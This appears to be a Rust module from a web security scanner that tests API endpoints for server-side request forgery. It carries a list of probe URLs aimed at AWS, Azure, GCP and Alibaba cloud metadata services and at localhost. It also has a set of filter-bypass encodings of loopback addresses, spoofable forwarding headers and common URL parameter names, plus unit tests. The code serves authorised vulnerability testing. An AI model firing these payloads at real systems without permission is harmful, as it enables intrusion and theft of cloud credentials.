mod probe;
mod header;
mod bypass;

use async_trait::async_trait;
use nevelio_core::types::{Endpoint, Finding, ParameterLocation};
use nevelio_core::{AttackModule, HttpClient, ScanSession};

// ---------------------------------------------------------------------------
// Probe definitions (shared with sub-modules via pub(crate))
// ---------------------------------------------------------------------------

pub(crate) struct SsrfProbe {
    pub url: &'static str,
    pub description: &'static str,
    pub indicators: &'static [&'static str],
}

pub(crate) const PROBES: &[SsrfProbe] = &[
    SsrfProbe { url: "http://169.254.169.254/latest/meta-data/",
        description: "AWS EC2 Instance Metadata Service (IMDSv1)",
        indicators: &["ami-id", "instance-id", "local-ipv4", "security-credentials", "iam"] },
    SsrfProbe { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        description: "Azure Instance Metadata Service",
        indicators: &["vmId", "subscriptionId", "resourceGroupName", "location", "osType"] },
    SsrfProbe { url: "http://metadata.google.internal/computeMetadata/v1/",
        description: "GCP Compute Engine Metadata",
        indicators: &["project/", "instance/", "serviceAccounts/"] },
    SsrfProbe { url: "http://100.100.100.200/latest/meta-data/",
        description: "Alibaba Cloud ECS Metadata",
        indicators: &["instance-id", "eipv4", "vpc-id"] },
    SsrfProbe { url: "http://localhost/",
        description: "Accès localhost",
        indicators: &["localhost", "127.0.0.1", "::1"] },
    SsrfProbe { url: "http://127.0.0.1:22/",
        description: "Port SSH interne (127.0.0.1:22)",
        indicators: &["ssh", "openssh", "SSH-"] },
    SsrfProbe { url: "http://0.0.0.0/",
        description: "Bind address 0.0.0.0",
        indicators: &[] },
];

pub(crate) struct SsrfBypass {
    pub url: &'static str,
    pub description: &'static str,
}

pub(crate) const BYPASS_PROBES: &[SsrfBypass] = &[
    SsrfBypass { url: "http://[::1]/",               description: "IPv6 loopback ::1" },
    SsrfBypass { url: "http://[::ffff:127.0.0.1]/",  description: "IPv4-mapped IPv6 loopback" },
    SsrfBypass { url: "http://[::ffff:7f00:1]/",     description: "IPv4-mapped IPv6 loopback (hex)" },
    SsrfBypass { url: "http://2130706433/",           description: "127.0.0.1 en décimal (2130706433)" },
    SsrfBypass { url: "http://2852039166/",           description: "169.254.169.254 en décimal" },
    SsrfBypass { url: "http://0177.0.0.1/",          description: "127.0.0.1 en octal" },
    SsrfBypass { url: "http://%31%32%37%2e%30%2e%30%2e%31/", description: "127.0.0.1 URL-encoded" },
    SsrfBypass { url: "http://127.0.0.1.nip.io/",   description: "nip.io wildcard DNS → 127.0.0.1" },
    SsrfBypass { url: "http://localtest.me/",        description: "localtest.me → 127.0.0.1" },
];

pub(crate) const SSRF_HEADERS: &[&str] = &[
    "X-Forwarded-Host", "X-Forwarded-For", "X-Real-IP",
    "X-Originating-IP", "True-Client-IP", "X-Client-IP",
];

pub(crate) const URL_PARAMS: &[&str] = &[
    "url", "uri", "redirect", "redirect_url", "redirect_uri", "next", "return",
    "return_url", "returnUrl", "callback", "callback_url", "callbackUrl",
    "destination", "dest", "target", "goto", "link", "href", "src", "source",
    "host", "endpoint", "remote", "fetch", "load", "include", "import",
    "proxy", "webhook", "action", "path", "file", "page", "site", "domain",
];

pub(crate) fn urlenc(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9'
            | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Module
// ---------------------------------------------------------------------------

pub struct SsrfModule;

#[async_trait]
impl AttackModule for SsrfModule {
    fn name(&self) -> &str { "ssrf" }

    fn description(&self) -> &str {
        "Détecte les Server-Side Request Forgery (SSRF) vers IMDS cloud, localhost et services internes"
    }

    async fn run(&self, _session: &ScanSession, client: &HttpClient, endpoints: &[Endpoint]) -> Vec<Finding> {
        let mut findings = Vec::new();

        for ep in endpoints {
            let candidates: Vec<String> = {
                let spec_url_params: Vec<String> = ep.parameters.iter()
                    .filter(|p| matches!(p.location, ParameterLocation::Query | ParameterLocation::Body)
                        && URL_PARAMS.iter().any(|known| p.name.to_lowercase().contains(known)))
                    .map(|p| p.name.clone())
                    .collect();

                if spec_url_params.is_empty() {
                    URL_PARAMS.iter().map(|s| s.to_string()).collect()
                } else {
                    spec_url_params
                }
            };

            for param in &candidates {
                if let Some(f) = probe::probe_ssrf(client, ep, param).await {
                    findings.push(f);
                    break;
                }
            }

            if let Some(f) = header::check_header_ssrf(client, ep).await {
                findings.push(f);
            }

            for param in &candidates {
                if let Some(f) = bypass::probe_ssrf_bypass(client, ep, param).await {
                    findings.push(f);
                    break;
                }
            }
        }

        findings
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn urlenc_encodes_colon_slash() {
        let encoded = urlenc("http://127.0.0.1/");
        assert!(encoded.contains("%3A"), "colon not encoded: {encoded}");
        assert!(encoded.contains("%2F"), "slash not encoded: {encoded}");
    }

    #[test]
    fn urlenc_safe_chars_unchanged() {
        assert_eq!(urlenc("abc-123_test.ok~"), "abc-123_test.ok~");
    }

    #[test]
    fn probes_list_non_empty() { assert!(!PROBES.is_empty()); }

    #[test]
    fn url_params_list_contains_common_names() {
        assert!(URL_PARAMS.contains(&"url"));
        assert!(URL_PARAMS.contains(&"redirect"));
        assert!(URL_PARAMS.contains(&"webhook"));
    }

    #[test]
    fn ssrf_module_name() { assert_eq!(SsrfModule.name(), "ssrf"); }
}
